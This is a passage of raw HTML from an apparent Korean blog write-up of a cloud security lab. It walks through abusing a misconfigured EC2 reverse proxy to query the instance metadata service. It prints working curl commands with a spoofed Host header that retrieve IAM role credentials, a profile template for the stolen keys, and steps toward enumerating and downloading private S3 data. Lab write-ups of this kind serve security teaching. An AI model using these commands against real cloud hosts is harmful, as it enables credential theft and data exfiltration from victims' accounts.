1080w,\n/static/47ff7d97423579247e2d9cb0309d3849/07a9c/29.png 1440w,\n/static/47ff7d97423579247e2d9cb0309d3849/4435f/29.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환결설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%B0%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환결설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환결설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABnklEQVQoz32RWW/aQBSFh8UBx2Bs45XFNsYLxhjCkhZSNe1D2///j75qJhGqorYPn+be2XTOuWK7+8yn2w+Ol2/sDi9cX34qzs/fOZ5f2e6uNPsbty+/SLKWp9Orute0Vwa6h+iYdHoWomu9rXHaUlYX1sWRZNVS1c+KvDyR5U8sk4bV+kC5uajzNNsrkmyPF6zxwpxoXimGjwHCdEMM20c3XYZjV62abmNYPg+Ggz7xGIymGHbA2Anp9CZKlehO6PZteppzR/bCi1LcIMUYzzDGESNzxsicM9B9tTdxYh5HobIjH/yJ3PuIsiwtShvSmkTWcbpjtqhVH69agqh4y+xd2b8QModFvMVxU4KoxA9z3GDNfFkTzkrsafJ+VmA58f3DvylWH8qwD6evFNVZBV/VF8r6ogYieznlZbxl6q3QjZBO16Lb+6/CnEXcKDWyVlOTtZ+pHLWhx8MoQDN8RH+C0CxE30LI4Sg+ZGiMQ+K0YRHXzJcbkrQhTFv8ZU00L5gFORt/Sx3t2IQNhVuRmBleP8Tp++iajTaY3hX+Bmt65OjIyAcbAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/caaff94dfd459777f1bda4ea4433d145/37523/0.png\"\n        srcset=\"/static/caaff94dfd459777f1bda4ea4433d145/e9ff0/0.png 180w,\n/static/caaff94dfd459777f1bda4ea4433d145/f21e7/0.png 360w,\n/static/caaff94dfd459777f1bda4ea4433d145/37523/0.png 720w,\n/static/caaff94dfd459777f1bda4ea4433d145/84cc5/0.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ul>\n<li>공격자가 EC2 인스턴스의 IP를 발견하였습니다. 다양한 방법으로 분석을 빈행하면서 reverse proxy 서버 역활을 하고 있음을 인자하였습니다.</li>\n<li>이러한 EC2 서버를 Reverse Proxy로 구성하는 이유는 on-premise에서 클라우드로 전환하는 과정에있는 아키텍처에서 자주 있는 상황입니다.</li>\n<li>분석후 공격자는 <code class=\"language-text\">curl</code> 을 통해 웹 서버에 요청을 보낼때 호스트 헤더를 EC2 metadata service의 ip 주소로 설정합니다.</li>\n<li>공격자가 조작한 요청 패킷이 성공적으로 수행되었다면 EC2 인스턴스에 연결된 IAM 인스턴스 프로파일의 액세스 키ID, Security 액세스 키, 세션 토큰등을 얻게됩니다.</li>\n<li>IAM credential 을 가지고 공격자는 Rule 정채에 부여된 강력한 권한을 사용하여 피해자의 클라우드 환경을 탐색할 수 가 있습니다.</li>\n<li>공격자는 Private S3 Bucket 을 list화 식별, 접근등 비인가된 행위를 지속적으로 합니다.</li>\n<li>Private S3 Bucket 내에서 공격자는 민감한 정보로 가득찬 여러 파일을 찾아서 로컬로 다운받아 배포를 하고 시나리오를 마칩니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"ec2-instance-ip-분석및-활용\" style=\"position:relative;\"><a href=\"#ec2-instance-ip-%EB%B6%84%EC%84%9D%EB%B0%8F-%ED%99%9C%EC%9A%A9\" aria-label=\"ec2 instance ip 분석및 활용 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 Instance, IP 분석및 활용</h3>\n<ul>\n<li>해당 시나리오는 공격자로부터 특정 서버를 분석하여 Reverse proxy 서버로 80포트가 운영되고 있는 곳을 알아냈습니다.</li>\n<li>Reverse proxy로 자주 사용되는 프레임워크인 Nginx, Traefik 등, 애플리케이션 계층의 <code class=\"language-text\">Edge Route</code> 를 실행하는 일반적인 시나리오 입니다.</li>\n<li>Reverse Proxy Server를 Exploit하여 EC2 Instance Metadata server(IMDS)에 연결을 할 수 있는지 확인을 해보겠습니다.</li>\n<li><code class=\"language-text\">CURL</code>  HTTP 클라이언트를 사용하여 메타데이터 검색용으로 새로운 HTTP 요청을 만듭니다.</li>\n<li>IMDS 서비스상에서 IP 주소를 참조하는 “Host” header를 추가하였습니다.</li>\n<li>만약에 Reverse Proxy Server에 관용적으로 Enable상태이면 IMDS Service로 전달이 되고 일부 메타데이터 정보를 얻을 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> -s http://54.147.185.174/latest/meta-data/ -H <span class=\"token string\">'Host:169.254.169.254'</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0UlEQVQY042RXU+DQBBFpwsskPKx0rXYLWiaGqOpLfbJiH32//+jY4BgSIPRh5M7DzM3c2ekOX/y+PSGLfeEec0yKUmyDWnmSIxjFTuqqGYb11TRPVavcVGF1Rv80KKj254wXvfIsWkp7A4vKBBJEZUji5EMUVd4OeINuvAMoswwM/JyeMdVz/h6hfJvZvEmqInOIa+nFlM8oHzza9OcaUe34XUth+MHQWgRyYaIfcy/Y48GnU5rac4XdvsTy/SOJN/+7zFhSaCLH6Ph/jHt5Ytv7JaJ/M+QfEsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/366fe2f7b66ebc122eb2a3a4daac00ee/37523/1.png\"\n        srcset=\"/static/366fe2f7b66ebc122eb2a3a4daac00ee/e9ff0/1.png 180w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/f21e7/1.png 360w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/37523/1.png 720w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/302a4/1.png 1080w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/07a9c/1.png 1440w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/7575b/1.png 1608w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 Link Local Address IP주소를 사용하여 외부 애플리케이션에 대해 연결을 관리할 수 가 있습니다.</li>\n</ul>\n<h3 id=\"ec2-metadata-service-query를-위해-잘못-구성한-reverse-proxy를-exploit\" style=\"position:relative;\"><a href=\"#ec2-metadata-service-query%EB%A5%BC-%EC%9C%84%ED%95%B4-%EC%9E%98%EB%AA%BB-%EA%B5%AC%EC%84%B1%ED%95%9C-reverse-proxy%EB%A5%BC-exploit\" aria-label=\"ec2 metadata service query를 위해 잘못 구성한 reverse proxy를 exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 Metadata Service Query를 위해 잘못 구성한 reverse proxy를 Exploit</h3>\n<ul>\n<li><code class=\"language-text\">Instance Metadata</code> 기능 때문에 클라우드 리소스상에서 더욱 심각한 보안 문제가 발생하고 있습니다.</li>\n</ul>\n<p><strong>Instance Metadata가 무엇일까?</strong></p>\n<ul>\n<li>실행중인 인스턴스를 구성하거나 관리하는데 사용할 수 있는 인스턴스에 대한 데이터입니다.</li>\n<li>인스턴스 메타데이터는 Link Local Address인 IP주소 호스트로 액세스할 수 있으며 인스턴스에서만 유효합니다.</li>\n<li>AWS 도큐먼트를 참고하면 AWS EC2 console, AWS CLI를 사용할 필요가 없고 인스턴스 메터데이터에서 인스턴스의 로컬 IP 주소에 액세스 하여 외부 애플리케이션에 대한 연결을 관리할 수 있다고 나와있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">http://169.254.169.254/latest/meta-data/</code></pre></div>\n<ul>\n<li>Reverse Proxy Server에 AWS EC2 IMDS에 액세스 할기 위해 Exploit을 할 수 있는 이유가 잘못된 구성입니다.</li>\n<li>공격자의 관점에서 IMDS에 저장된 가장 가치가 있는 정보는 IAM Rule Credential 입니다.</li>\n<li>IAM Rule Credential을 탈취할 수 있다면 IAM Rule에 해당하는 모든 것을 확인할 수 있습니다.</li>\n<li>실제로 EC2 Instance에 S3 Bucket과 같은 AWS 계정의 다른 서비스와 상호 작용하는데 사용하는 IAM Rule이 있는 것이 일반적입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABUklEQVQozz2RS46cMBRF2f8eMkrW0RvIoAcZpAatKNW2wVAU2BT4gzEnsqvST7rcN0BHR89NSok4/mHXF4K+cGyWMx2UmeeZcbwTvMe5DefcK54UAtE5tm0j7jsxRo7joNn3Hd/9Joh33Oc7x2PijKkCjV24CsWt1fSy51NqrleFkIq+G+jantkuFbSuG0WuKZ8988wJMSXymZ/AZUUOE3o06LGlGxWd/kvfd+hhZF5WTp4TQngaplR0PTEGYgjs+8H5+ssYgxSKrhMI8R0hvtVW6kKrNK1S2GKYM491ZS+GOVMBpXM+OY6FlMbXDQ1CSqQqZj3GWoyxFTLNc9299+Scv9Ks6y9u4w+MuTJNjmX5ifdvX0Api6Gm7TRa9wzDDd2XHuo+3u+c54m1lvIejfd37PLB5pZqWOb/XaqhkLRtV1Pgxbbuqq2tVFvv93isFfgPUBoWTarjkSYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/d9a2984dece1a730c4b609238e4012bb/37523/2.png\"\n        srcset=\"/static/d9a2984dece1a730c4b609238e4012bb/e9ff0/2.png 180w,\n/static/d9a2984dece1a730c4b609238e4012bb/f21e7/2.png 360w,\n/static/d9a2984dece1a730c4b609238e4012bb/37523/2.png 720w,\n/static/d9a2984dece1a730c4b609238e4012bb/302a4/2.png 1080w,\n/static/d9a2984dece1a730c4b609238e4012bb/7321b/2.png 1184w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 도큐먼트를 살펴보면 해당 IMDS 형태로 특정 경로를 통해 다양한 정보들을 확인할 수 있는 리스트를 확인할 수 있습니다.</li>\n<li>EC2 Instance에서 IMDS를 통해 액세스할 수 있는 IAM Credential을 추출해 보겠습니다.</li>\n<li><code class=\"language-text\">/iam/security-credentials/</code> 해당 route에 접근하여 사용되는 <code class=\"language-text\">role-name</code>을 확인할 수 있습니다. 이러한 정책에 해당하는 규칙이 어떤 접근을 하는지, 어떤 역활을 하는지가 중요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> -s http://54.147.185.174/latest/meta-data/iam/security-credentials/ -H <span class=\"token string\">'Host:169.254.169.254'</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAT0lEQVQI1wXBTQqAIBCA0Q7Sqk3Qz6iBYyooIwRtu/9hvt6bdsmcrpLyoPUXvY2oHX9VSjZW+zjyQy2DmBriIuIU5xXxyhUSW+zMaqQl8AMfQSCeD+05twAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3\"\n        title=\"3\"\n        src=\"/static/69752f8622a20fc1d659e962434aedc5/37523/3.png\"\n        srcset=\"/static/69752f8622a20fc1d659e962434aedc5/e9ff0/3.png 180w,\n/static/69752f8622a20fc1d659e962434aedc5/f21e7/3.png 360w,\n/static/69752f8622a20fc1d659e962434aedc5/37523/3.png 720w,\n/static/69752f8622a20fc1d659e962434aedc5/cda19/3.png 785w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">cg-banking-WAF-Role-cloud_breach_s3_cgidmy4bprdx0t</code> 탈취한 정책 이름을 토대로 route 하게되면 AccessKeyId, SecretAccessKey, Token  정보를 알아낼 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> -s http://54.147.185.174/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cloud_breach_s3_cgidmy4bprdx0t <span class=\"token punctuation\">\\</span>\n-H <span class=\"token string\">'Host:169.254.169.254'</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA8ElEQVQY013LS1OCYBiGYdKmAjGtaVJUBMqULwICOX0e84Btmpq2/f//cTdiqxb3XO/ieRXhJfhBhhtKOqMIczhhaAseRz59y2WsP5A2BXHTJdUFlmpwod6hNrpoukGj2UO/PqXpXRTTekF4ObbjYw6fad9aXGkdLtV7lFoLpd5COT/W/vOG2r/O6u3Kau8FkqzYk8s9clZSzA/ks5JclkTTNcF0iZ8sCbP1qWRNnLyR5lvSYlfd0XRV/RxV4mRFIbcUywPB/J3wVeL5GX5YECYLVmLB59OGj/Gmcu7E2I6HMXDpDdxKoz/BtDy+vn/4BegGcsTHx8ftAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4\"\n        title=\"4\"\n        src=\"/static/fa17d351396aaf3fdf82e1061d0fc178/37523/4.png\"\n        srcset=\"/static/fa17d351396aaf3fdf82e1061d0fc178/e9ff0/4.png 180w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/f21e7/4.png 360w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/37523/4.png 720w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/302a4/4.png 1080w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/07a9c/4.png 1440w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/eee07/4.png 1628w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>탈취한 IAM Rule Credential 은 다른 IAM Credential처럼 사용할 수 있습니다.</li>\n</ul>\n<h3 id=\"상호-연결된-ec2-인스턴스-프로파일을-가정\" style=\"position:relative;\"><a href=\"#%EC%83%81%ED%98%B8-%EC%97%B0%EA%B2%B0%EB%90%9C-ec2-%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4-%ED%94%84%EB%A1%9C%ED%8C%8C%EC%9D%BC%EC%9D%84-%EA%B0%80%EC%A0%95\" aria-label=\"상호 연결된 ec2 인스턴스 프로파일을 가정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>상호 연결된 EC2 인스턴스 프로파일을 가정</h3>\n<ul>\n<li>앞에서 탈취한 IAM Rule Credential을 사용하여 수행할 수 있는 작업들을 Enum 하기 위해서 AWS CLI를 사용하여 프로파일을 지정해야 합니다.</li>\n<li>하지만 IAM Rule Credential은 Life cycle이 짧고 Session Token이 존재하기 때문에 Session Token은 파일의 프로파일에 수동으로 추가해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABKklEQVQY03VQ207CQBTcB6MiYqKoIKAhCNgLLaXttl3oZUsLFRCjxv//lTFng4nR+HAyszOzJ7vDnnSOVmeM2/YIV9d9dO91DMcu+gMbjyMHg6GDy2YfJ7Ub1OptnJ61FNIcHTfBWOPHXICZVgTTFrCdGBN7rhaZloBYrBFEBVw/g8el4l6QYzqLFSd/Ygv1gE5PQ+/BwF1XA6MwD5dw3ERd5lGBUJRwfQkRV4qTT/idJY/4zMvgh0t4PEcQlSrDZLFHuX5HnG6Q5S9YJM8grdp+oli9IS9flU6YZFvI5V7pqdxhnlRKS+QOq+oDi3QDRgvGmg/qkr5KqJsBXC7heKnyjEkIzQxgUD2WUGeqinLWdA7dDKEZXFXHqGTG6r/KPT9o9QP/bxp/tC+sALIIqVMbvgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"5\"\n        title=\"5\"\n        src=\"/static/a253c569ba43a147a56cd7bdd846fda9/37523/5.png\"\n        srcset=\"/static/a253c569ba43a147a56cd7bdd846fda9/e9ff0/5.png 180w,\n/static/a253c569ba43a147a56cd7bdd846fda9/f21e7/5.png 360w,\n/static/a253c569ba43a147a56cd7bdd846fda9/37523/5.png 720w,\n/static/a253c569ba43a147a56cd7bdd846fda9/c67d4/5.png 723w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"s3-bucket-리스트\" style=\"position:relative;\"><a href=\"#s3-bucket-%EB%A6%AC%EC%8A%A4%ED%8A%B8\" aria-label=\"s3 bucket 리스트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3 Bucket 리스트</h3>\n<ul>\n<li>앞선 IAM Rule Credential 정보를 토대로 AWS Profile을 생성했습니다.</li>\n<li>해당 정보를 사용하여 IAM enumerate하여 Rule Access를 확인하여 해당 권한에 맞는 공격 벡터를 찾게 되었습니다.</li>\n<li>iam Rule Enumerate를 사용하는데 있어서 밑의 enumerate-iam 오픈 소스 도구를 활용하여 정보를 확인하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\naws_secret_access_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span>\naws_session_access_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SESSION_KEY<span class=\"token operator\">></span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">https://github.com/andresriancho/enumerate-iam</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABT0lEQVQY002OS4/TQBCEDVdgOSGksAnZJOvE3sT2jMfvVzx2YjYEIUV7yt648f9/wIc8oIhDqau7S1VlibBkr0/U+2e0PlEMF2R/IVIlWdFTNQOt/o7uz+juTNkMvIgTv+srr+onV/GDqzjzK33h6GRYWy+nqJ+Js560GMiLI2miSbKDQV4ON65iTZR0hNUBUfaE9ZGg6PCyFi9vab5dsHxRkuYHZLQnTjt8URmeZD0irFGJRsUtYbS/QY3/pGPn5SwWHrYtWa8Vy1WAFcgaX1bYG4UXFMwXHstHgbtNeVj67PyCxSpg48YI1bCypdGMczbfGj6db5k97JhMHSypxtQW5ynBE6UR2o5CqgZ3lxpDETYEsjKBaze6GRqzr098+rzk3YcJ7+8mWPYm5HEdmrSx2Zepw/3MNe1G4Xj7H5P7jblbbz9ivbn7i5H/2/8Alkm8TzJzd30AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"6\"\n        title=\"6\"\n        src=\"/static/2e85d60c37ef34d568e662d7567f4ae9/37523/6.png\"\n        srcset=\"/static/2e85d60c37ef34d568e662d7567f4ae9/e9ff0/6.png 180w,\n/static/2e85d60c37ef34d568e662d7567f4ae9/f21e7/6.png 360w,\n/static/2e85d60c37ef34d568e662d7567f4ae9/37523/6.png 720w,\n/static/2e85d60c37ef34d568e662d7567f4ae9/22475/6.png 1039w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM Rule에는 계정의 S3 Bucket에대한 권한이 있는 사실을 알 수 가 있습니다. AWS CLI를 사용하여 Bucket을 Enum하고 S3bucket에 저장된 데이터를 다운로드 해보겠습니다.</li>\n</ul>\n<h3 id=\"s3-sync-명령을-통해-cardholder-data-bucket에서-중요한-데이터-탈취\" style=\"position:relative;\"><a 